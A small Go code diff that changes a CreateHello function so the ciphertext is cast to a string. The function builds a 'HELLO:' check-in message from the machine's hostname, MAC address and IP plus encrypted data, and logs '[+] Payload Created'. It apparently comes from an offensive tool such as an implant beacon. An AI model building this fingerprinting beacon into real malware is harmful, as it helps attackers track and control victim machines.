@@ -364,7 +364,7 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 	}
 	fmt.Printf("Encrypted: %x\n", ciphertext)
 	
-	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + ciphertext
+	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String() + "#"  + string(ciphertext)
 	fmt.Println("[+] Payload Created:", hello)
 
 	return hello
